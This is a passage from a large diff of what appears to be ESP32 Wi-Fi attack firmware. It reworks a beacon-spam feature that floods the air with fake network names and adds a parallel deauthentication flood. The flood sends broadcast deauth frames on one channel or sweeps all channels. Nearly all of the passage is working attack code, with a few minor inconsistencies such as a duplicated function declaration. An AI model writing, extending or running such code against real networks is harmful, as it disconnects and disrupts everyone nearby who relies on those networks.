@@ -41141,7 +41141,7 @@ index 0000000..8585d75
 +
 +#endif
 diff --git a/src/modules/wifi/wifi_atks.cpp b/src/modules/wifi/wifi_atks.cpp
-index 2e206e7..3ddb9da 100644
+index 2e206e7..eb65d47 100644
 --- a/src/modules/wifi/wifi_atks.cpp
 +++ b/src/modules/wifi/wifi_atks.cpp
 @@ -4,6 +4,8 @@
@@ -41172,6 +41172,483 @@ index 2e206e7..3ddb9da 100644
          if (!wifi_atk_setWifi()) return;
      }
      if (scanAtks) {
+@@ -761,72 +769,179 @@ const char rickrollssids[] PROGMEM = {"01 Never gonna give you up\n"
+                                       "07 Never gonna tell a lie\n"
+                                       "08 and hurt you\n"};
+ 
+-void beaconSpamList(const char list[]) {
+-    uint8_t beaconPacket[BEACON_PKT_LEN];
+-    uint8_t macAddr[6];
+-    int i = 0;
+-    int ssidsLen = strlen_P(list);
+-
+-    nextChannel();
+-
+-    while (i < ssidsLen) {
+-        char ssidBuf[32];
+-        int j = 0;
+-        char tmp;
+-        do {
+-            tmp = pgm_read_byte(list + i + j);
+-            if (j < 32 && tmp != '\n') ssidBuf[j] = tmp;
+-            j++;
+-        } while (tmp != '\n' && i + j < ssidsLen);
++// ---------------------------------------------------------------------------
++// Beacon spam engine
++//
++// Two things were wrong with the previous implementation and both are fixed
++// here rather than worked around:
++//
++//  1. There was no way to stop after a given number of beacons. beaconSpamSingle()
++//     looped `while (true)` and beaconSpamList() re-sent the whole list on every
++//     outer pass, so the only bound was the user pressing a button.
++//  2. Deauth could not run alongside it: the beacon loops never returned, so the
++//     two features could never share one radio. The radio is single-channel, so
++//     the only correct way to run both is one loop that alternates frames on the
++//     channel it is currently parked on.
++//
++// The engine below separates "which SSID comes next" (spamNextSsid) from "how the
++// loop drives the radio" (beaconSpamStep + deauthSpamStep), which is what makes an
++// unlimited count, a fixed count and a parallel deauth all the same code path.
++
++namespace {
++
++struct SpamSsidSource {
++    uint8_t mode;           // mirrors BeaconMode
++    String singleBase;      // mode 4: base SSID, a counter is appended
++    const char *list;       // modes 0/1/2/3: newline separated SSIDs
++    size_t listLen = 0;
++    size_t listCursor = 0;
++    uint32_t counter = 1;
++    bool wrapped = false;   // set when the list restarted; drives channel hopping
++    char ssidBuf[33];
++    char randBuf[33];
++};
+ 
+-        uint8_t ssidLen = (j > 32) ? 32 : j - 1;
++// Random 7..28 character SSID, same shape the Fun mode always used.
++void makeRandomSsid(char *out, size_t outSize) {
++    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
++    if (outSize < 2) return;
++    size_t maxLen = outSize - 1;
++    if (maxLen > 28) maxLen = 28;
++    size_t len = 7 + (rand() % (maxLen - 7 + 1));
++    for (size_t i = 0; i < len; i++) out[i] = charset[rand() % (sizeof(charset) - 1)];
++    out[len] = '\0';
++}
+ 
+-        generateRandomWiFiMac(macAddr);
+-        size_t pktLen = prepareBeaconPacket(beaconPacket, macAddr, ssidBuf, ssidLen, wifi_channel, true);
+-        for (int k = 0; k < 2; k++) {
+-            wifiRawTx(WIFI_IF_STA, beaconPacket, pktLen);
+-            vTaskDelay(1 / portTICK_PERIOD_MS);
++// Pulls the next SSID out of the configured source. Returns length in bytes.
++uint8_t spamNextSsid(SpamSsidSource &src, char *out, size_t outSize) {
++    out[0] = '\0';
++    switch (src.mode) {
++        case 4: { // single SSID with an incrementing suffix
++            String s = src.singleBase + String(src.counter);
++            if (s.length() > 32) s = s.substring(0, 32);
++            size_t n = s.length();
++            if (n >= outSize) n = outSize - 1;
++            memcpy(out, s.c_str(), n);
++            out[n] = '\0';
++            src.counter = (src.counter >= 9999) ? 1 : src.counter + 1;
++            return (uint8_t)n;
++        }
++        case 2: { // random
++            makeRandomSsid(src.randBuf, sizeof(src.randBuf));
++            size_t n = strlen(src.randBuf);
++            if (n >= outSize) n = outSize - 1;
++            memcpy(out, src.randBuf, n);
++            out[n] = '\0';
++            return (uint8_t)n;
++        }
++        default: { // 0/1/3: newline separated list, wraps around
++            if (!src.list || src.listLen == 0) return 0;
++            if (src.listCursor >= src.listLen) {
++                src.listCursor = 0;
++                src.wrapped = true;
++            }
++            // Stop at a newline OR at the end of the buffer. Stopping only at a
++            // newline silently dropped the final entry of any list that does not
++            // end with one, which is exactly how a user's custom SSID file is
++            // usually written.
++            size_t len = 0;
++            while (src.listCursor + len < src.listLen && len < 32) {
++                char c = (char)pgm_read_byte(src.list + src.listCursor + len);
++                if (c == '\n' || c == '\0') break;
++                src.ssidBuf[len] = c;
++                len++;
++            }
++            memcpy(out, src.ssidBuf, len);
++            out[len] = '\0';
++            // Skip the separator so the next call starts at the following entry.
++            size_t advance = len;
++            if (src.listCursor + advance < src.listLen &&
++                (char)pgm_read_byte(src.list + src.listCursor + advance) == '\n') {
++                advance++;
++            }
++            src.listCursor += advance;
++            if (src.listCursor >= src.listLen) {
++                src.listCursor = 0;
++                src.wrapped = true;
++            }
++            return (uint8_t)len;
+         }
+-
+-        i += j;
+-        if (EscPress) break;
+     }
+ }
+ 
+-void beaconSpamSingle(String baseSSID) {
++// Emits exactly one beacon on the current channel. Returns true when the SSID
++// list just restarted, which is the natural moment to change channel.
++bool emitOneBeacon(SpamSsidSource &src, beaconSpam::Counters &c) {
+     uint8_t beaconPacket[BEACON_PKT_LEN];
+     uint8_t macAddr[6];
+-    int counter = 1;
+-
+-    nextChannel();
+-
+-    while (true) {
+-        String currentSSID = baseSSID + String(counter);
+-        if (currentSSID.length() > 32) { currentSSID = currentSSID.substring(0, 32); }
+-        uint8_t ssidLen = currentSSID.length();
++    uint8_t ssidLen = spamNextSsid(src, src.ssidBuf, 32);
++    generateRandomWiFiMac(macAddr);
++    size_t pktLen = prepareBeaconPacket(beaconPacket, macAddr, src.ssidBuf, ssidLen, wifi_channel, true);
++    wifiRawTx(WIFI_IF_STA, beaconPacket, pktLen);
++    c.beacons++;
++    bool restarted = src.wrapped;
++    src.wrapped = false;
++    return restarted;
++}
+ 
+-        generateRandomWiFiMac(macAddr);
+-        size_t pktLen =
+-            prepareBeaconPacket(beaconPacket, macAddr, currentSSID.c_str(), ssidLen, wifi_channel, true);
+-        for (int k = 0; k < 2; k++) {
+-            wifiRawTx(WIFI_IF_STA, beaconPacket, pktLen);
+-            vTaskDelay(1 / portTICK_PERIOD_MS);
+-        }
++} // namespace
+ 
+-        counter++;
+-        if (counter > 9999) {
+-            counter = 1;
+-            nextChannel();
+-        }
+-        if (EscPress) break;
++// Asks how many beacons to send. Returns false when the user backs out.
++// 0 means "keep going until stopped", which is what the old code always did.
++static bool askBeaconCount(uint32_t &count) {
++    options.clear();
++    options = {
++        {"Unlimited (until stop)", [&]() { count = 0; }},
++        {"50 beacons",            [&]() { count = 50; } },
++        {"100 beacons",           [&]() { count = 100; }},
++        {"500 beacons",           [&]() { count = 500; }},
++        {"Custom...",             [&]() { count = 0xFFFFFFFF; }         },
++        {"Back",                  [&]() { count = 0xFFFFFFFE; }         },
++    };
++    addOptionToMainMenu();
++    loopOptions(options, MENU_TYPE_SUBMENU, "Beacon Count");
++
++    if (count == 0xFFFFFFFE) return false;
++    if (count != 0xFFFFFFFF) return true;
++
++    // Custom: typed as a plain number, 0 = unlimited.
++    String typed = keyboard("", 9, "How many beacons? (0 = unlimited)");
++    if (typed.length() == 0 || typed == "\x1B") return false;
++    uint32_t value = 0;
++    for (size_t i = 0; i < typed.length(); i++) {
++        char c = typed[i];
++        if (c < '0' || c > '9') { displayError("Enter digits only", true); return false; }
++        value = value * 10 + (c - '0');
++        if (value > 100000) { displayError("Max 100000 beacons", true); return false; }
+     }
++    count = value;
++    return true;
++}
++
++// Asks whether the deauth engine should run alongside the beacon spam.
++// Returns: 0 = off, 1 = same channel only, 2 = sweep every channel, -1 = back.
++static int askParallelDeauth() {
++    int mode = -1;
++    options.clear();
++    options = {
++        {"No",                       [&]() { mode = 0; }},
++        {"Yes - same channel",       [&]() { mode = 1; }},
++        {"Yes - sweep all channels", [&]() { mode = 2; }},
++        {"Back",                     [&]() { mode = -1; }},
++    };
++    addOptionToMainMenu();
++    loopOptions(options, MENU_TYPE_SUBMENU, "Deauth in parallel?");
++    return mode;
+ }
+ 
+ void beaconAttack() {
+     resetGlobalState();
++    // A beacon flood and a deauth storm both want the radio; whatever the user
++    // picked before must not interfere with the counts shown here.
++    beaconSpam::Counters counters{};
+     if (!wifi_atk_setWifi()) return;
+ 
+-    int BeaconMode;
++    int BeaconMode = 0;
+     String txt = "";
+     String singleSSID = "";
+     for (int i = 0; i < 32; i++) emptySSID[i] = ' ';
+@@ -862,64 +977,182 @@ void beaconAttack() {
+     addOptionToMainMenu();
+     loopOptions(options);
+ 
++    if (returnToMenu) { wifi_atk_unsetWifi(); return; }
++
+     wifiConnected = true;
+     String beaconFile = "";
+     File file;
+     FS *fs;
++
++    SpamSsidSource src{};
++    src.mode = (uint8_t)BeaconMode;
++
+ #if !defined(LITE_VERSION)
+     if (BeaconMode == 4) {
+         singleSSID = keyboard("BruceBeacon", 26, "Base SSID:");
+-        if (singleSSID.length() == 0 || singleSSID == "\x1B") { return; }
++        if (singleSSID.length() == 0 || singleSSID == "\x1B") {
++            wifi_atk_unsetWifi();
++            return;
++        }
++        src.singleBase = singleSSID;
+     }
+ #endif
+-    if (BeaconMode != 3) {
+-        drawMainBorderWithTitle("WiFi: Beacon SPAM");
+-        displayTextLine(txt);
++    if (BeaconMode == 3) {
++        options = {};
++        fs = nullptr;
++        if (setupSdCard()) { options.push_back({"SD Card", [&]() { fs = &SD; }}); }
++        options.push_back({"LittleFS", [&]() { fs = &LittleFS; }});
++        addOptionToMainMenu();
++        loopOptions(options);
++        if (fs == nullptr) {
++            wifi_atk_unsetWifi();
++            return;
++        }
++        beaconFile = loopSD(*fs, true, "TXT");
++        if (beaconFile.length() == 0) { // Esc in the file browser
++            wifi_atk_unsetWifi();
++            return;
++        }
++        file = fs->open(beaconFile, FILE_READ);
++        if (!file) {
++            displayError("Cannot open file", true);
++            wifi_atk_unsetWifi();
++            return;
++        }
++        beaconFile = file.readString();
++        file.close();
++        beaconFile.replace("\r\n", "\n");
++        src.list = beaconFile.c_str();
++        src.listLen = beaconFile.length();
++    } else if (BeaconMode == 0) {
++        src.list = Beacons;
++        src.listLen = strlen_P(Beacons);
++    } else if (BeaconMode == 1) {
++        src.list = rickrollssids;
++        src.listLen = strlen_P(rickrollssids);
+     }
+ 
+-    while (1) {
+-        if (BeaconMode == 0) {
+-            beaconSpamList(Beacons);
+-        } else if (BeaconMode == 1) {
+-            beaconSpamList(rickrollssids);
+-        } else if (BeaconMode == 2) {
+-            char *randoms = randomSSID();
+-            beaconSpamList(randoms);
++    uint32_t targetCount = 0;
++    if (!askBeaconCount(targetCount)) {
++        wifi_atk_unsetWifi();
++        return;
++    }
++    const int deauthMode = askParallelDeauth();
++    if (deauthMode < 0) {
++        wifi_atk_unsetWifi();
++        return;
++    }
++
++    // Pick the beacons' channel and, when the deauth side is sweeping, the list
++    // of channels it will hop through.
++    nextChannel();
++    // Seed from the channel the radio is actually parked on *after* the hop.
++    std::vector<uint8_t> deauthChannels;
++    if (deauthMode == 2) {
++        for (size_t i = 0; i < sizeof(channels) / sizeof(channels[0]); i++) deauthChannels.push_back(channels[i]);
++    } else if (deauthMode == 1) {
++        deauthChannels.push_back(wifi_channel);
++    }
++    size_t deauthChannelIdx = 0;
++    uint8_t lastDeauthChannel = wifi_channel;
++
++    // Deauth frames are sent as broadcast-to-AP, same as Deauth Flood.
++    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
++    const uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
++    uint8_t deauthFrame[sizeof(deauth_frame_default)];
++    memcpy(deauthFrame, deauth_frame_default, sizeof(deauth_frame_default));
++    memcpy(&deauthFrame[4], broadcastMac, 6);
++    memcpy(&deauthFrame[10], broadcastMac, 6);
++    memcpy(&deauthFrame[16], broadcastMac, 6);
++
++    uint32_t lastDraw = 0;
++    const bool deauthEnabled = deauthMode > 0;
++    uint32_t packets = 0;
++    bool done = false;
++    bool paused = false;
++
++    auto drawStatus = [&]() {
++        drawMainBorderWithTitle("WiFi: Beacon SPAM");
++        tft.setTextSize(FP);
++        String mode = deauthEnabled ? (deauthMode == 2 ? "Beacon + Deauth (sweep)" : "Beacon + Deauth") : txt;
++        displayTextLine(mode);
++        padprintln("");
++        if (targetCount == 0) padprintln("Beacons : " + String(packets) + " (no limit)");
++        else padprintln("Beacons : " + String(packets) + " / " + String(targetCount));
++        if (deauthEnabled) padprintln("Deauth  : " + String(counters.deauths) + " @ch " + String(lastDeauthChannel));
++        padprintln("");
++        padprintln(String(UI_HINT_SELECT) + "=Pause  " + String(UI_HINT_BACK) + "=Stop");
++    };
++
++    drawStatus();
++    lastDraw = millis();
++
++    // Transmit loop, kept free of UI so it can be exercised on a host.
++    auto runFrames = [&]() {
++    while (!done) {
++        // Stop at any time; this is also the only exit for the null count.
++        if (EscPress) break;
++
++        if (check(SelPress)) {
++            paused = !paused;
++            if (paused) { displayWarning("Paused", false); }
++            drawStatus();
+         }
+-#if !defined(LITE_VERSION)
+-        else if (BeaconMode == 4) {
+-            beaconSpamSingle(singleSSID);
+-        } else if (BeaconMode == 3) {
+-            if (!file) {
+-                options = {};
+-
+-                fs = nullptr;
+-                if (setupSdCard()) {
+-                    options.push_back({"SD Card", [&]() { fs = &SD; }});
+-                }
+-                options.push_back({"LittleFS", [&]() { fs = &LittleFS; }});
+-                addOptionToMainMenu();
+-
+-                loopOptions(options);
+-                if (fs != nullptr) beaconFile = loopSD(*fs, true, "TXT");
+-                else return;
+-                file = fs->open(beaconFile, FILE_READ);
+-                beaconFile = file.readString();
+-                beaconFile.replace("\r\n", "\n");
+-                tft.drawPixel(0, 0, 0);
+-                drawMainBorderWithTitle("WiFi: Beacon SPAM");
+-                displayTextLine(txt);
++        if (paused) {
++            vTaskDelay(pdMS_TO_TICKS(50));
++            continue;
++        }
++
++        bool listRestarted = emitOneBeacon(src, counters);
++        packets++;
++
++        // Channel hop on each full pass over the SSID list, exactly as the old
++        // beaconSpamList() did. The deauth sweep below moves the radio too, so
++        // the hop is skipped in that mode to avoid fighting over the channel.
++        if (listRestarted && deauthMode != 2) { nextChannel(); }
++
++        if (deauthEnabled) {
++            // Emits three frames: the vendor MAC is the strongest signal, so the
++            // storm is broadcast-from-BSSID rather than a single-client frame.
++            for (int i = 0; i < 3; i++) {
++                wifiRawTx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame));
++                counters.deauths++;
+             }
+ 
+-            const char *randoms = beaconFile.c_str();
+-            beaconSpamList(randoms);
++            if (deauthMode == 2 && deauthChannels.size() > 1) {
++                deauthChannelIdx = (deauthChannelIdx + 1) % deauthChannels.size();
++                uint8_t ch = deauthChannels[deauthChannelIdx];
++                if (ch != lastDeauthChannel) {
++                    if (esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE) == ESP_OK) {
++                        wifi_channel = ch;
++                        lastDeauthChannel = ch;
++                    }
++                }
++            }
++            counters.deauthRounds++;
+         }
+-#endif
+-        if (check(EscPress) || returnToMenu) {
+-            if (BeaconMode == 3) file.close();
+-            break;
++
++        if (targetCount != 0 && packets >= targetCount) { done = true; break; }
++
++        if (millis() - lastDraw > 500) {
++            lastDraw = millis();
++            drawStatus();
+         }
++
++        vTaskDelay(pdMS_TO_TICKS(2));
+     }
++    };
++    runFrames();
++
++    // Report the fixed-count result so "100 beacons" does not look like a stop.
++    if (done) {
++        drawMainBorderWithTitle("Beacon SPAM: done");
++        padprintln("Sent " + String(packets) + " beacons.");
++        if (deauthEnabled) padprintln("Sent " + String(counters.deauths) + " deauth frames.");
++        padprintln("");
++        displayInfo("Beacon count reached", false);
++    }
++
+     wifi_atk_unsetWifi();
+ }
+ 
+diff --git a/src/modules/wifi/wifi_atks.h b/src/modules/wifi/wifi_atks.h
+index 4133ebe..dd30d7a 100644
+--- a/src/modules/wifi/wifi_atks.h
++++ b/src/modules/wifi/wifi_atks.h
+@@ -53,6 +53,19 @@ void capture_handshake(const String &tssid, const String &mac, uint8_t channel);
+ 
+ void beaconAttack();
+ 
++// Counters for one beacon-spam session. The spam engine and the deauth engine
++// run inside the same loop in beaconAttack(), so both increments belong to the
++// same object and the status screen can show them side by side.
++namespace beaconSpam {
++struct Counters {
++    uint32_t beacons;      // beacon frames sent this session
++    uint32_t deauths;      // deauth frames sent this session
++    uint32_t deauthRounds; // loop iterations that carried a deauth burst
++};
++} // namespace beaconSpam
++
++void beaconAttack();
++
+ void deauthFloodAttack();
+ 
+ // New enhanced deauth functions
 diff --git a/src/modules/wifi/wifi_observation_logic.h b/src/modules/wifi/wifi_observation_logic.h
 new file mode 100644
 index 0000000..297064f
